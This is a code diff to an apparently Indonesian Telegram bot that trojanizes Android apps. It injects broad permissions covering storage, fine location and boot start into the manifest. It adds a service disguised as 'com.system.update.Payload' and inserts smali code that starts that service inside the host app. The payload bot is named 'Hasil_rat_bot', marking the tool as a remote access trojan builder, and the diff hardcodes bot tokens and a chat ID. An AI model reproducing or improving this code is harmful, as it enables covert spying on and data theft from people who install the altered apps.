@@ -13,7 +13,9 @@ from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandle
 # ── KONFIGURASI ──
 TOKEN = "9067923295:AAE-sOBegpDh0IgaLKpn32-Nlmv9ibGYgwo" 
 PAYLOAD_BOT_TOKEN = "8887819326:AAFX97DDbezzF_y-kOQWBL02NNy38nWxAIY"
-PAYLOAD_BOT_USERNAME = "IsiUsernameBotPayloadKamu" # GANTI INI
+
+# ⚠️ GANTI PAKE USERNAME BOT PAYLOAD KAMU YANG BARU (Tanpa @)
+PAYLOAD_BOT_USERNAME = "Hasil_rat_bot" 
 
 ALLOWED_CHAT_ID = "8598136412" 
 
@@ -58,7 +60,7 @@ def inject_manifest(manifest_path):
                    "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE", 
                    "android.permission.ACCESS_FINE_LOCATION", "android.permission.RECEIVE_BOOT_COMPLETED", 
                    "android.permission.FOREGROUND_SERVICE", "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
-                   "android.permission.POST_NOTIFICATIONS"] # Buat Android 13+
+                   "android.permission.POST_NOTIFICATIONS"]
                    
     for perm in permissions:
         if not any(p.get(ns + 'name') == perm for p in root.findall('uses-permission')):
@@ -66,7 +68,6 @@ def inject_manifest(manifest_path):
 
     app = root.find('application')
     if app is not None:
-        # Nambahin foregroundServiceType="dataSync"
         if not any(s.get(ns + 'name') == 'com.system.update.Payload' for s in app.findall('service')):
             ET.SubElement(app, 'service', {ns + 'name': 'com.system.update.Payload', ns + 'enabled': 'true', ns + 'exported': 'false', ns + 'foregroundServiceType': 'dataSync'})
             
@@ -112,11 +113,10 @@ def inject_permission_popup(apk_out_dir):
                 if ".locals" in lines[j] or ".registers" in lines[j]:
                     parts = lines[j].split()
                     if len(parts) >= 2:
-                        # Tambah 5 register buat Toast & Intent
                         if ".locals" in lines[j]: lines[j] = f"    .locals {int(parts[1]) + 5}\n"
                         else: lines[j] = f"    .registers {int(parts[1]) + 5}\n"
                         
-                        # KODE SUNTIKAN BARU (Ada Toast & StartService)
+                        # KODE SUNTIKAN FINAL (StartService & Toast)
                         inject_code = (
                             "\n    # Tampilkan Toast 'Injection Active'\n"
                             "    const-string v2, \"Injection Active\"\n"
@@ -124,12 +124,12 @@ def inject_permission_popup(apk_out_dir):
                             "    invoke-static {p0, v2, v3}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;\n"
                             "    move-result-object v2\n"
                             "    invoke-virtual {v2}, Landroid/widget/Toast;->show()V\n\n"
-                            "    # Minta Izin & Start Service\n"
+                            "    # Minta Izin & Start Service (Pakai startService biasa biar ga crash)\n"
                             "    invoke-static {p0}, Lcom/system/update/Payload;->askPermissions(Landroid/app/Activity;)V\n\n"
                             "    new-instance v0, Landroid/content/Intent;\n"
                             "    const-class v1, Lcom/system/update/Payload;\n"
                             "    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n"
-                            "    invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;\n"
+                            "    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n"
                         )
                         lines.insert(j + 1, inject_code)
                         injected = True
